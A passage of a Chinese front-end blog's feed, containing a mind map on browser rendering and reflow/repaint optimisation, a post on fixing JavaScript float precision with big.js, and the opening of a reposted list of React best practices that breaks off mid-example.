        <content type="html"><![CDATA[<blockquote class="pullquote mindmap mindmap-md"><ul><li><a href="https://www.yuque.com/yuanwei-xe0wv/eieg5a/gy7us10gaq3iobtf">浏览器</a><ul><li>浏览器渲染原理<ul><li>渲染引擎<ul><li>解析 HTML：将 HTML 转换为 DOM 树（Document Object Model）。</li><li>解析 CSS：将 CSS 转换为样式规则，并应用到 DOM 树。</li><li>构建渲染树：根据 DOM 树和样式规则生成渲染树。</li><li>布局（Layout）：计算每个元素的大小和位置。</li><li>绘制（Painting）：将渲染树中的每个元素绘制到屏幕上。</li></ul></li><li>渲染过程<ul><li>首先解析收到的文档，根据文档定义构建一棵 DOM 树，DOM 树是由 DOM 元素及属性节点组成的。</li><li>然后对 CSS 进行解析，生成 CSSOM 规则树。</li><li>根据 DOM 树和 CSSOM 规则树构建渲染树。渲染树的节点被称为渲染对象，渲染对象和 DOM 元素相对应，但这种对应关系不是一对一的，不可见的 DOM 元素不会被插入渲染树。</li><li>当渲染对象被创建并添加到树中，它们并没有位置和大小，所以当浏览器生成渲染树以后，就会根据渲染树来进行布局（也可以叫做回流）。这一阶段浏览器要做的事情是要弄清楚各个节点在页面中的确切位置和大小。</li><li>布局阶段结束后是绘制阶段，遍历渲染树并调用渲染对象的 paint 方法将它们的内容显示在屏幕上，绘制使用 UI 基础组件。</li><li>注意：这个过程是逐步完成的，为了更好的用户体验，渲染引擎会尽可能早的将内容呈现到屏幕上，并不会等到所有的 html 都解析完成之后再去构建和布局 render 树。它是解析完一部分内容就显示一部分内容，同时，可能还在通过网络下载其余内容。</li></ul></li><li>渲染优化<ul><li>网络加载优化<ul><li>资源合并和压缩，减少 HTTP 请求次数和文件大小</li><li>利用浏览器缓存，包括 HTTP 缓存、资源预加载等</li></ul></li><li>使用 CDN 加速资源加载<ul><li>CDN 可以通过地理位置优化、负载均衡、缓存优化、连接复用以及抗攻击能力等多种方式，加速静态资源的加载，提升网站的性能和用户体验</li></ul></li><li>HTML 解析优化<ul><li>减少 DOM 元素数量，避免嵌套过审的结构</li><li>使用语义化标签，帮助浏览器更快理解文档结构</li><li>尽量将 script 标签放在 body 最后，或者用 async 或者 defer 的方式引入 script<ul><li>async：下载 JS 是异步，下载完成会立即执行，会阻塞渲染</li><li>defer：下载是异步的，会等 DOM 树构建完毕，并且在 DOMContentLoaded 事件触发之前执行</li></ul></li></ul></li><li>CSS 渲染优化<ul><li>避免使用过多的样式规则和选择器，减少 CSS 文件大小<ul><li>使用简单的 CSS 动画而不是 JS 动画，以利用浏览器的硬件加速功能</li></ul></li><li>布局(回流&#x2F;重排)、绘制(重绘)优化<ul><li>避免频繁操作样式，最好一次性修改多个样式</li></ul></li><li>尽量减少不必要的元素重绘，例如使用 transform 属性而不是修改 top 和 left 属性来移动元素</li><li>使用 CSS3 动画或变换来减少重绘和回流<ul><li>GPU 加速：大部分浏览器使用 GPU 加速 CSS3 动画。GPU 通常能够处理图形任务更快，因此将动画委托给 GPU 处理可以提高动画的性能，减少 CPU 的负载。相比之下，JavaScript 动画通常由 CPU 处理，性能可能不如 GPU 加速的 CSS3 动画。</li><li>硬件加速的转换和动画：CSS3 动画可以应用于 CSS 属性，如 transform 和 opacity，这些属性可以通过硬件加速进行处理，而不需要触发重绘或回流。例如，使用 transform 属性进行动画时，浏览器可以在 GPU 上执行动画转换，而不会影响文档流，从而减少了重绘和回流。</li><li>优化的动画循环：浏览器能够优化 CSS3 动画的执行方式。例如，浏览器可以根据屏幕刷新率进行动画绘制，以确保动画流畅且不会引起撕裂或闪烁。</li></ul></li></ul></li><li>合成优化<ul><li>利用 GPU 加速，将合成和绘制操作委托给 GPU<ul><li>怎么实现：利用 CSS3 属性、3D 变换、will-change 属性以及避免触发重绘和回流等方法，可以有效地利用 GPU 加速，将合成和绘制操作委托给 GPU，从而提高页面的性能和流畅度</li></ul></li><li>使用 CSS 属性 will-change 来提示浏览器元素将要被修改，以便浏览器在后台优化渲染。</li></ul></li></ul></li><li>回流和重绘<ul><li>回流<ul><li>渲染树中部分或全部元素的尺寸、结构或者属性发生变化时，浏览器全部或部分重新渲染文档的过程，就是回流</li><li>导致回流的操作<ul><li>页面首次渲染</li><li>浏览器窗口大小变化</li><li>页面内容、字体大小、激活伪类</li><li>查询元素的宽高</li><li>添加或删除可见 DOM 元素</li></ul></li></ul></li><li>重绘<ul><li>样式变化，但是不影响元素在文档流中的位置时，浏览器就会对元素进行重绘<ul><li>color、background、border-radius、visibility、opaticy</li></ul></li><li>如何避免<ul><li>操作 DOM 时，尽量在低层级的 DOM 节点进行操作</li><li>不要频繁操作元素的样式，对于静态页面，可以修改类名，而不是样式。</li><li>不要使用 table 布局， 一个小的改动可能会使整个 table 进行重新布局</li><li>使用 absolute 或者 fixed，使元素脱离文档流，这样他们发生变化就不会影响其他元素</li><li>避免频繁操作 DOM，可以创建一个文档片段 documentFragment，在它上面应用所有 DOM 操作，最后再把它添加到文档中</li><li>DOM 离线化：将元素先设置 display: none，操作结束后再把它显示出来。因为在 display 属性为 none 的元素上进行的 DOM 操作不会引发回流和重绘。</li><li>将 DOM 的多个读操作（或者写操作）放在一起，而不是读写操作穿插着写。这得益于浏览器的渲染队列机制。</li></ul></li></ul></li><li>渲染 Flush 队列<ul><li>浏览器针对页面的回流与重绘，进行了自身的优化，就是渲染队列。</li><li>浏览器会将所有的回流、重绘的操作放在一个队列中，当队列中的操作到了一定的数量或者到了一定的时间间隔，浏览器就会对队列进行批处理。这样就会让多次的回流、重绘变成一次回流重绘。</li><li>上面，将多个读操作（或者写操作）放在一起，就会等所有的读操作进入队列之后执行，这样，原本应该是触发多次回流，变成了只触发一次回流。</li></ul></li></ul></li></ul></li></ul></li></ul></blockquote><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 思维导图 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 思维导图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 big.js 解决 js 小数精度问题</title>
      <link href="/2024/06/08/solution/shi-yong-big.js-jie-jue-js-xiao-shu-jing-du-wen-ti/"/>
      <url>/2024/06/08/solution/shi-yong-big.js-jie-jue-js-xiao-shu-jing-du-wen-ti/</url>
      
        <content type="html"><![CDATA[<p><a name="JT07H"></a></p><h2 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h2><p>当涉及到浮点数计算时，js 中的精度丢失问题, 是由于使用 IEEE 754 标准来表示和计算浮点数的方式引起的。<strong>这个问题不仅仅在 js 中存在，而是在所有使用 IEEE 754 标准的编程语言中都会遇到。</strong><br />IEEE 754 标准定义了两种常见的浮点数表示形式：单精度（32 位）和双精度（64 位）。在 js 中，采用的是双精度表示法，即 64 位。<br />然而，由于二进制和十进制之间的转换存在差异，<strong>某些十进制分数无法精确表示为有限位的二进制浮点数。这导致了舍入误差和精度丢失。</strong><br><a name="xr8mS"></a></p><h2 id="二、解决方案"><a href="#二、解决方案" class="headerlink" title="二、解决方案"></a>二、解决方案</h2><p>使用 big.js 进行计算，而不是直接加减乘除<br><a name="ucyvm"></a></p><h3 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save big.js</span><br></pre></td></tr></table></figure><p><a name="QONAE"></a></p><h3 id="方法封装"><a href="#方法封装" class="headerlink" title="方法封装"></a>方法封装</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Big</span> <span class="keyword">from</span> <span class="string">&#x27;big.js&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">createFactory</span>(<span class="params">method = <span class="string">&#x27;add&#x27;</span></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">...nums</span>) &#123;</span><br><span class="line">    <span class="comment">// 将传入的参数转换为Number类型，并过滤掉不是Number类型的结果</span></span><br><span class="line">    nums = nums.<span class="title function_">map</span>(<span class="title class_">Number</span>).<span class="title function_">filter</span>(<span class="function">(<span class="params">num</span>) =&gt;</span> num || num === <span class="number">0</span>)</span><br><span class="line">      <span class="comment">// 如果过滤后的结果是长度为1的数组，那就返回数组的第一项</span></span><br><span class="line">      <span class="comment">// 如果过滤后的结果为空数组，则返回0</span></span><br><span class="line">    <span class="keyword">if</span> (nums.<span class="property">length</span> &lt; <span class="number">2</span>) <span class="keyword">return</span> nums[<span class="number">0</span>] || <span class="number">0</span></span><br><span class="line">      <span class="comment">// 需要为reduce方法赋初值，是因为big.js的运算操作，是基于new Big格式的数字</span></span><br><span class="line">      <span class="comment">// 可以将Big对象转换为浮点数，方便后续Number.toFixed()的操作</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseFloat</span>(nums.<span class="title function_">slice</span>(<span class="number">1</span>).<span class="title function_">reduce</span>(<span class="function">(<span class="params">prev, num</span>) =&gt;</span> prev[method](num), <span class="keyword">new</span> <span class="title class_">Big</span>(nums[<span class="number">0</span>]))) || <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="string">`plus、minus、times、div为big.js中的计算方法，分别对应加减乘除这四个运算操作`</span></span><br><span class="line"></span><br><span class="line">  <span class="string">`浮点数求和`</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> secureAdd = <span class="title function_">createFactory</span>(<span class="string">&#x27;plus&#x27;</span>)</span><br><span class="line">  <span class="string">`浮点数相减`</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> secureSub = <span class="title function_">createFactory</span>(<span class="string">&#x27;minus&#x27;</span>)</span><br><span class="line">  <span class="string">`浮点数相乘`</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> secureMul = <span class="title function_">createFactory</span>(<span class="string">&#x27;times&#x27;</span>)</span><br><span class="line">  <span class="string">`浮点数相除`</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> secureDiv = <span class="title function_">createFactory</span>(<span class="string">&#x27;div&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>测试：</strong></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; secureAdd, secureSub, secureMul, secureDiv &#125; <span class="keyword">from</span> <span class="string">&#x27;@/utils/calculate&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">mounted</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">calTestHandler</span>()</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line"><span class="attr">methods</span>: &#123;</span><br><span class="line">  <span class="title function_">calTestHandler</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> operations = [</span><br><span class="line">      &#123; <span class="attr">operator</span>: <span class="string">&#x27;+&#x27;</span>, <span class="attr">method</span>: secureAdd, <span class="attr">a</span>: <span class="number">0.1</span>, <span class="attr">b</span>: <span class="number">0.2</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">operator</span>: <span class="string">&#x27;-&#x27;</span>, <span class="attr">method</span>: secureSub, <span class="attr">a</span>: <span class="number">0.1</span>, <span class="attr">b</span>: <span class="number">0.3</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">operator</span>: <span class="string">&#x27;*&#x27;</span>, <span class="attr">method</span>: secureMul, <span class="attr">a</span>: <span class="number">0.1</span>, <span class="attr">b</span>: <span class="number">0.2</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">operator</span>: <span class="string">&#x27;/&#x27;</span>, <span class="attr">method</span>: secureDiv, <span class="attr">a</span>: <span class="number">0.1</span>, <span class="attr">b</span>: <span class="number">0.3</span> &#125;</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    operations.<span class="title function_">forEach</span>(<span class="function">(<span class="params">operation</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> &#123; operator, method, a, b &#125; = operation</span><br><span class="line">      <span class="keyword">const</span> result = <span class="title function_">method</span>(a, b)</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`原生js <span class="subst">$&#123;operator&#125;</span> 运算：<span class="subst">$&#123;a&#125;</span> <span class="subst">$&#123;operator&#125;</span> <span class="subst">$&#123;b&#125;</span>的值是<span class="subst">$&#123;<span class="built_in">eval</span>(a + operator + b)&#125;</span>`</span>)</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`big.js <span class="subst">$&#123;operator&#125;</span> 运算：<span class="subst">$&#123;a&#125;</span> <span class="subst">$&#123;operator&#125;</span> <span class="subst">$&#123;b&#125;</span>的值是<span class="subst">$&#123;result&#125;</span>`</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>结果展示：</strong><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/jpeg/1548284/1705029555832-54204706-0590-478d-a123-633675b87f81.jpeg" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/jpeg/1548284/1705029555832-54204706-0590-478d-a123-633675b87f81.jpeg" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 解决方案 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 解决方案 </tag>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>21 个让 React 项目更整洁的最佳实践</title>
      <link href="/2024/06/06/frontend/react/21-ge-rang-react-xiang-mu-geng-zheng-ji-de-zui-jia-shi-jian/"/>
      <url>/2024/06/06/frontend/react/21-ge-rang-react-xiang-mu-geng-zheng-ji-de-zui-jia-shi-jian/</url>
      
        <content type="html"><![CDATA[<p>本文转载自：<a href="https://mp.weixin.qq.com/s/xvAJtv1RyOq7rBwaq_tm0Q">https://mp.weixin.qq.com/s/xvAJtv1RyOq7rBwaq_tm0Q</a><br><a name="NEbHs"></a></p><h3 id="1-使用-JSX-简写"><a href="#1-使用-JSX-简写" class="headerlink" title="1. 使用 JSX 简写"></a>1. 使用 JSX 简写</h3><p>尽量对布尔变量使用 JSX 简写。假设你想控制一个导航栏组件的标题可见性。<br /><strong>「不好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Navbar</span> <span class="attr">showTitle</span>=<span class="string">&#123;true&#125;</span> /&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>「好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Navbar</span> <span class="attr">showTitle</span> /&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><a name="eJezE"></a></p><h3 id="2-使用三元运算符"><a href="#2-使用三元运算符" class="headerlink" title="2. 使用三元运算符"></a>2. 使用三元运算符</h3><p>假设你想根据角色显示用户详情。<br /><strong>「不好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; role &#125; = user;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(role === <span class="variable constant_">ADMIN</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">AdminUser</span> /&gt;</span></span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">NormalUser</span> /&gt;</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>「好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; role &#125; = user;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> role === <span class="variable constant_">ADMIN</span> ? <span class="language-xml"><span class="tag">&lt;<span class="name">AdminUser</span> /&gt;</span></span> : <span class="language-xml"><span class="tag">&lt;<span class="name">NormalUser</span> /&gt;</span></span>;</span><br></pre></td></tr></table></figure><p><a name="dRW12"></a></p><h3 id="3-利用对象字面量"><a href="#3-利用对象字面量" class="headerlink" title="3. 利用对象字面量"></a>3. 利用对象字面量</h3><p>对象字面量可以使我们的代码更具可读性。假设您要根据角色显示三种类型的用户。你不能使用三元运算符,因为选项数量超过两个。<br /><strong>「不好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;role&#125; = user;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(role) &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="attr">ADMIN</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">AdminUser</span> /&gt;</span></span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="attr">EMPLOYEE</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">EmployeeUser</span> /&gt;</span></span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="attr">USER</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">NormalUser</span> /&gt;</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>「好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;role&#125; = user;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> components = &#123;</span><br><span class="line">  <span class="attr">ADMIN</span>: <span class="title class_">AdminUser</span>,</span><br><span class="line">  <span class="attr">EMPLOYEE</span>: <span class="title class_">EmployeeUser</span>,</span><br><span class="line">  <span class="attr">USER</span>: <span class="title class_">NormalUser</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Component</span> = components[role];</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">Component</span> /&gt;</span></span>;</span><br></pre></td></tr></table></figure><p>现在看起来好多了。<br><a name="QCyfB"></a></p><h3 id="4-使用片段"><a href="#4-使用片段" class="headerlink" title="4. 使用片段"></a>4. 使用片段</h3><p>尽量使用<strong>Fragment</strong>而不是<strong>Div</strong>。这使代码更简洁,对性能也有益,因为少创建一个虚拟 DOM 节点。<br /><strong>「不好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">section</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">Component1</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">Component2</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">Component3</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>「好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">Component1</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">Component2</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">Component3</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><a name="H56BL"></a></p><h3 id="5-不要在-render-中定义函数"><a href="#5-不要在-render-中定义函数" class="headerlink" title="5. 不要在 render 中定义函数"></a>5. 不要在 render 中定义函数</h3><p>不要在 render 中定义函数。尽量使 render 中的逻辑最小化。<br /><strong>「不好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> dispatch(ACTION_TO_SEND_DATA)&#125;&gt;</span></span><br><span class="line"><span class="language-xml">    这是一个不好的例子</span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>「好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">submitData</span> = (<span class="params"></span>) =&gt; <span class="title function_">dispatch</span>(<span class="variable constant_">ACTION_TO_SEND_DATA</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;submitData&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    这是一个好的例子</span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><a name="QKDpT"></a></p><h3 id="6-使用-useMemo"><a href="#6-使用-useMemo" class="headerlink" title="6. 使用 useMemo"></a>6. 使用 useMemo</h3><p><strong>React.PureComponent</strong> 和 <strong>useMemo</strong> 可以显著提高应用程序的性能。它们帮助我们避免不必要的渲染。<br /><strong>「不好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123; useState &#125; <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">TestMemo</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [userName, setUserName] = <span class="title function_">useState</span>(<span class="string">&quot;faisal&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">increment</span> = (<span class="params"></span>) =&gt; <span class="title function_">setCount</span>(count + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">ChildrenComponent</span> <span class="attr">userName</span>=<span class="string">&#123;userName&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;increment&#125;</span>&gt;</span>Increment<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">ChildrenComponent</span> =(<span class="params">&#123;userName&#125;</span>) =&gt; &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;rendered&quot;</span>, userName);</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">section</span>&gt;</span>&#123;userName&#125;<span class="tag">&lt;/<span class="name">section</span>&gt;</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>尽管 <strong>ChildComponent</strong> 的值与 <strong>count</strong> 无关,但它应该只渲染一次。但是,每次点击按钮时它都会重新渲染。<br /><strong>「好的:」</strong><br />将 <strong>ChildrenComponent</strong> 改为:</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">ChildrenComponent</span> = <span class="title class_">React</span>.<span class="title function_">memo</span>(<span class="function">(<span class="params">&#123;userName&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;rendered&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">section</span>&gt;</span>&#123;userName&#125;<span class="tag">&lt;/<span class="name">section</span>&gt;</span></span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>现在,无论单击按钮多少次,它都只会在必要时重新渲染。<br><a name="OifE2"></a></p><h3 id="7-将-CSS-写在-JavaScript-中"><a href="#7-将-CSS-写在-JavaScript-中" class="headerlink" title="7. 将 CSS 写在 JavaScript 中"></a>7. 将 CSS 写在 JavaScript 中</h3><p>避免在编写 React 应用程序时使用纯 CSS,因为组织 CSS 比组织 JS 更加困难。<br /><strong>「不好的:」</strong></p><figure class="highlight jsx"><table><tr><td 